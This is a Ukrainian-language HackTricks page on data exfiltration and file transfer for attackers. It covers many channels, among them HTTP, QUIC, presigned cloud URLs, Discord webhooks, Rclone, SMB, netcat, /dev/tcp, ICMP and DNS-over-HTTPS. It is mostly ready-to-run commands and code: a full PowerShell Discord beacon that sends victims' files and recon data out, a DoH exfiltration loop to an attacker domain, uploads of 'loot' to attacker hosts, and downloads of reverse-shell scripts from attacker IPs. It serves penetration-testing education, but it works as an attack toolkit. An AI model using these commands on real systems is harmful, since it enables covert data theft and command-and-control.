# Exfiltration

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> Щоб побачити повний приклад підготовки loot у `C:\Users\Public` і його ексфільтрації за допомогою Rclone для імітації легітимних резервних копій, перегляньте наведений нижче сценарій.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Поширені домени зі списку дозволених для ексфільтрації інформації

Перейдіть на [https://lots-project.com/](https://lots-project.com/), щоб знайти поширені домени зі списку дозволених, якими можна зловживати

## Копіювання\&вставлення Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### Завантаження файлів

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Модуль Python [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **HTTPS-сервер**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

Якщо правила контролю вихідного трафіку налаштовані на перевірку класичного **TCP/443**, але поблажливі до **UDP/443**, примусове використання **HTTP/3** може перенести передавання на **QUIC** замість TLS-over-TCP. Кінцева точка атакувальника має підтримувати HTTP/3 нативно (наприклад, reverse proxy або endpoint для завантаження, який уже оголошує `Alt-Svc: h3`).

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

Дослідження 2025 року (QUIC-Exfil) виявило, що зашифровані заголовки QUIC і динамічна зміна адрес можуть ускладнити виявлення ексфільтрації на рівні firewall порівняно з каналами на основі TLS або DNS. У ньому також було продемонстровано метод із preferred address сервера, який маскує ексфільтрацію під міграцію з'єднання на боці сервера.<sup>[[9]](#references)</sup>

### Завантаження об'єктів у сховище за попередньо підписаними URL / із делегованим доступом

Якщо ви можете створити або отримати короткочасний **підписаний URL**, жертві знадобиться лише звичайний HTTPS-клієнт. Це дає змогу не встановлювати на хості cloud SDK і не зберігати довгострокові облікові дані.<sup>[[8]](#references)</sup> Це також дає змогу злитися зі звичайним трафіком до об'єктного сховища.

**Linux / macOS (попередньо підписаний `PUT` для AWS S3)**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 попередньо підписаний `PUT`)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Примітки:
- Попередньо підписані URL-адреси / SAS-токени зазвичай обмежують **шлях**, **HTTP-метод** і **термін дії**.<sup>[[8]](#references)[[10]](#references)</sup>
- Для Azure Blob `Put Blob` обов’язковий заголовок `x-ms-blob-type: BlockBlob`.<sup>[[10]](#references)</sup>
- Цей підхід добре працює з `curl`, `Invoke-WebRequest` або будь-яким власним імплантом, здатним надсилати необроблений HTTPS `PUT`.

### goshs

[goshs](https://github.com/patrickhener/goshs) — це однобінарна заміна `python3 -m http.server`.<sup>[[4]](#references)</sup>
Він підтримує завантаження, вивантаження, WebDAV, SFTP, SMB, TLS, автентифікацію, посилання для спільного доступу та функції OOB-співпраці (DNS, SMTP, захоплення NTLM-хешів).<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) для C2 та Data Exfiltration

Webhooks — це HTTPS endpoints лише для запису, які приймають JSON і необов’язкові частини файлів. Їх часто дозволено для довірених SaaS-доменів, і вони не потребують OAuth/API keys, що робить їх корисними для beaconing і exfiltration із мінімальними обмеженнями.<sup>[[5]](#references)[[6]](#references)</sup>

Основні ідеї:
- Endpoint: Discord використовує https://discord.com/api/webhooks/<id>/<token>
- POST multipart/form-data із частиною на ім’я payload_json, що містить {"content":"..."}, і необов’язковими частинами файлів на ім’я file.
- Цикл оператора: періодичний beacon -> розвідка директорій -> цільова exfiltration файлів -> дамп розвідданих -> сон. HTTP 204 NoContent/200 OK підтверджують доставку.

PoC на PowerShell (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

Примітки:
- Подібні шаблони застосовуються до інших платформ для спільної роботи (Slack/Teams), що використовують incoming webhooks; відповідно змініть URL і JSON-схему.
- Інформацію про DFIR артефактів кешу Discord Desktop і відновлення webhook/API див. на пов’язаній сторінці нижче.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Артефакти реєстру як канал зворотного зв’язку

Коли код уже виконується у worker-середовищі для збірки чи документації та може автентифікуватися в реєстрі пакунків, сам реєстр може слугувати каналом зворотного зв’язку. У прикладах GemStuffer один payload створював **новий gem** із отриманими файлами відповідей і намагався надіслати його через `/api/v1/gems` RubyGems; інший записував отриману відповідь у `README.md`, видаляв його завантажувач `.yardopts` і намагався опублікувати **нову версію того самого gem**. Це відрізняється від hook під час встановлення й потребує чинних облікових даних для публікації та доступу до зовнішнього реєстру.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Другий варіант використовував **конфігурацію webhook реєстру як сховище**, а не як callback для вихідного з’єднання. Відповідь стискалася за допомогою zlib, кодувалася у Base64, сумісний з URL, з неї видалялося доповнення, а потім вона розбивалася на нумеровані сегменти URL довжиною до 220 символів. За наявності ключа з правом керування webhook запит `POST /api/v1/web_hooks` приймає `gem_name` і `url`; запит `GET /api/v1/web_hooks.json` виводить список збережених URL цього облікового запису. Нумеровані сегменти й маркер завершення дають змогу авторизованому читачеві відновити дані. Домен `example.com` у прикладі був лише заповнювачем у збереженому значенні, а не свідченням наявності робочої кінцевої точки C2 чи успішного доставлення.<sup>[[13]](#references)[[14]](#references)</sup>

```text
POST /api/v1/web_hooks   gem_name=<owned-gem>&url=https://example.com/A000/<chunk>/
GET  /api/v1/web_hooks.json   # read stored URLs using the same account's key
```

Для початкового [шляху виконання YARD `.yardopts`](../pentesting-web/dependency-confusion.md#related-pattern-package-controlled-documentation-builds) канал реєстру є лише можливістю після виконання. Успішний `POST` або артефакт, який згодом можна прочитати, потрібно спостерігати окремо; наведені приклади переважно демонструють спроби публікації та реєстрації.<sup>[[12]](#references)[[13]](#references)</sup>

## Rclone (ексфільтрація в cloud/object-storage)

Сучасні оператори часто **спершу розміщують loot локально**, а потім використовують [Rclone](https://rclone.org/), щоб передача виглядала як звичайне завдання резервного копіювання або синхронізації. Практичний варіант:

1. Звичайний remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. Обгортка `crypt`, щоб **вміст і назви файлів шифрувалися на стороні клієнта**
3. Необов’язкова обгортка `chunker`, якщо провайдер обмежує розмір об’єктів або потрібні менші одиниці завантаження

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

Нотатки:
- `crypt` може шифрувати як вміст файлів, так і їхні назви.<sup>[[3]](#references)</sup>
- `chunker` прозоро розбиває великі файли на частини та збирає їх під час завантаження.<sup>[[11]](#references)</sup>
- `rclone.conf` зберігає секрети `crypt` в **обфускованому** вигляді, що не забезпечує надійного захисту даних у стані спокою.<sup>[[3]](#references)</sup> Для короткочасних операцій краще використовувати окрему тимчасову конфігурацію та видалити її після завершення. Якщо її потрібно зберігати довше, краще використовувати шифровану конфігурацію (`RCLONE_CONFIG_PASS` / `--password-command`), а не залишати незахищений `rclone.conf` на диску.<sup>[[11]](#references)</sup>
- Якщо цільова система вже синхронізує **OneDrive**, **Google Drive** або **Dropbox**, копіювання loot у синхронізовану директорію дає змогу скористатися вже схваленим клієнтом замість розміщення нового бінарного файла для передавання даних.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### FTP server (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP-сервер (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP-сервер (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** клієнт

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali як сервер

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Або створіть SMB-шару **за допомогою Samba**:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) — це альтернатива в одному бінарному файлі, яка надає файли через SMB і збирає NTLM-хеші клієнтів, що підключаються.<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

У атакувальника має бути запущений SSHd.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

Якщо на цільовій системі є SSH, зловмисник може змонтувати каталог із цільової системи на своїй.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### Завантажити файл із жертви

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### Завантаження файлу на пристрій жертви

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

дякуємо **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

Якщо класичний DNS через UDP/53 створює багато шуму або заблокований, але вихідний HTTPS широко дозволений, звичну схему ексфільтрації через DNS-мітки можна передавати в запитах **DoH** до публічного резолвера. Довжина кожної мітки має бути значно меншою за ліміт DNS у 63 байти; використовуйте безпечний для DNS набір символів, наприклад Base32.

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

На authoritative DNS server для `exf.attacker.tld` відсортуйте запити за числовим префіксом і відновіть потік Base32. Так передавання даних відбувається через HTTPS до resolver, а не через класичний DNS UDP/53.<sup>[[2]](#references)</sup>

Для інструментів повнодуплексного DNS-тунелювання (`iodine`, `dnscat2` тощо) див. [the tunneling page](tunneling-and-port-forwarding.md).

## **SMTP**

Якщо ви можете надсилати дані на SMTP-сервер, можна налаштувати SMTP-сервер для отримання даних за допомогою python:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) може швидко запустити SMTP-сервер, щоб перехоплювати зворотні виклики електронною поштою під час сценаріїв OOB exfiltration.<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

Отримані електронні листи та callbacks відображаються безпосередньо у виводі термінала.
Можна поєднати з DNS callback server для повного OOB-покриття:

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

За замовчуванням у XP і 2003 (в інших системах його потрібно явно додати під час інсталяції)

У Kali **запустіть TFTP-сервер**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**TFTP-сервер на Python:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

На **victim** підключіться до Kali server:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

Завантажте файл за допомогою однорядкового PHP-скрипту:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**Жертва**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

Програма `debug.exe` не лише дає змогу перевіряти бінарні файли, а й **відновлювати їх із hex**. Це означає, що, отримавши hex-послідовність бінарного файла, `debug.exe` може створити цей файл. Однак важливо враховувати, що `debug.exe` має **обмеження: вона може зібрати файли розміром до 64 КБ**.<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

Потім скопіюйте й вставте текст у windows-shell, і буде створено файл nc.exe.

## References

- [1] [Передавання файлів до Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS — DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Бекенд `crypt` у Rclone](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord як C2 і залишені кешовані докази](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Discord Webhooks — виконання Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Набір інструментів для судової експертизи Discord (аналізатор кешу)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Завантаження об’єктів за допомогою підписаних URL — Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: використання функції Preferred Address сервера QUIC для атак із викрадення даних](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) — Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Документація Rclone](https://rclone.org/docs/#configuration-encryption)
- [12] [RubyHack — дослідження RubyGems і RubyDoc](https://www.rubyhack.ai/)
- [13] [Дослідження безпеки JFrog — аналіз GemStuffer](https://research.jfrog.com/post/gemstuffer-openai-rubygems)
- [14] [API RubyGems.org — методи gem і webhook](https://guides.rubygems.org/rubygems-org-api/)
{{#include ../banners/hacktricks-training.md}}
